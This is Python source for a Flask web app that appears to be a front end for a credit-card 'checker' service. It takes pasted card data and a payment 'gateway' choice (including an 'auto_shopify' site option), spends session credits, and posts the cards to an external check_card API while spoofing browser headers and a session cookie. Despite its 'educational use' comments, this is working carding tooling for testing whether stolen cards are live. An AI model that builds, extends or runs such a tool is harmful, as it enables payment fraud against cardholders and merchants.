import requests
from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import os
from datetime import timedelta
import json # Import json for pretty printing the raw response

app = Flask(__name__)

# Configuration for session management
app.secret_key = os.environ.get('SECRET_KEY', 'a_very_secret_key_for_educational_use')
app.permanent_session_lifetime = timedelta(minutes=30)

# --- Configuration for External API ---
EXTERNAL_API_URL = 'https://web.blueitx.xyz/api/check_card.php'
# IMPORTANT: The user MUST set a valid PHPSESSID environment variable for the API to work.
# The value below is a placeholder and will likely fail without a real session ID.
PHPSESSID = os.environ.get('PHPSESSID', 'PLACEHOLDER_PHPSESSID_REQUIRED') 

# --- Core Logic ---

def initialize_session():
    """Initializes session variables for a new or reset user."""
    if 'credits' not in session:
        session['credits'] = 20
    if 'guest_name' not in session:
        session['guest_name'] = "Guest"
    session.permanent = True

def deduct_credit():
    """Deducts one credit from the user's session."""
    if session.get('credits', 0) > 0:
        session['credits'] -= 1
        return True
    return False

def external_api_validation(card_data, gateway, site=None):
    """
    Calls the external validation API with the user-provided structure.
    """
    
    cookies = {
        'PHPSESSID': PHPSESSID,
    }

    # Using the headers provided by the user to mimic the request
    headers = {
        'authority': 'web.blueitx.xyz',
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://web.blueitx.xyz',
        'referer': 'https://web.blueitx.xyz/checker.php',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'action': 'check_card',
        'card': card_data,
        'gateway': gateway,
    }
    
    if site and gateway == 'auto_shopify':
        json_data['site'] = site

    try:
        response = requests.post(EXTERNAL_API_URL, cookies=cookies, headers=headers, json=json_data, timeout=15)
        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
        
        api_result = response.json()
        
        # Standardize the result for the template
        # We assume the API returns a 'status' or 'message' field to determine success/fail
        # Since we don't know the exact structure, we'll check for common success indicators
        
        # For educational purposes, we'll return the raw response and let the user inspect it
        
        # Check if the API call itself was successful (HTTP 200)
        return {
            "status": "success", 
            "message": f"API call to {gateway} successful. Raw Response:",
            "raw_response": json.dumps(api_result, indent=4),
            "gateway": gateway
        }

    except requests.exceptions.HTTPError as e:
        return {
            "status": "error",
            "message": f"HTTP Error {response.status_code} from API. Check PHPSESSID and API status.",
            "raw_response": str(e),
            "gateway": gateway
        }
    except requests.exceptions.RequestException as e:
        return {
            "status": "error",
            "message": f"Request failed: Could not connect to API. Check URL and network.",
            "raw_response": str(e),
            "gateway": gateway
        }
    except json.JSONDecodeError:
        return {
            "status": "error",
            "message": f"API returned non-JSON response. Status: {response.status_code}",
            "raw_response": response.text,
            "gateway": gateway
        }


# --- Routes ---

@app.before_request
def before_request():
    """Ensures the session is initialized before every request."""
    initialize_session()

@app.route('/', methods=['GET', 'POST'])
def index():
    """Main page for the validator."""
    if request.method == 'POST':
        # Handle name change
        if 'guest_name' in request.form:
            new_name = request.form['guest_name'].strip()
            if new_name:
                session['guest_name'] = new_name
            return redirect(url_for('index'))

        # Handle validation request
        card_data = request.form.get('card_data')
        gateway = request.form.get('gateway')
        site = request.form.get('site')
        
        if not card_data or not gateway:
            session['last_result'] = {"status": "error", "message": "Please enter card data and select a gateway."}
            return redirect(url_for('index'))

        if not deduct_credit():
            session['last_result'] = {"status": "error", "message": "Not enough credits. Please reset session."}
            return redirect(url_for('index'))

        # Perform external API validation
        result = external_api_validation(card_data, gateway, site)
        session['last_result'] = result
        
        return redirect(url_for('index'))

    # GET request
    last_result = session.pop('last_result', None)
    
    return render_template(
        'index.html',
        guest_name=session['guest_name'],
        credits=session['credits'],
        last_result=last_result,
        phpsessid_set=(PHPSESSID != 'PLACEHOLDER_PHPSESSID_REQUIRED')
    )

@app.route('/reset')
def reset_session():
    """Resets the user's session (credits and name)."""
    session.clear()
    return redirect(url_for('index'))

@app.route('/api/status')
def api_status():
    """API endpoint to check current status."""
    return jsonify({
        "guest_name": session['guest_name'],
        "credits": session['credits'],
        "phpsessid_set": (PHPSESSID != 'PLACEHOLDER_PHPSESSID_REQUIRED')
    })

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=os.environ.get('PORT', 5000))
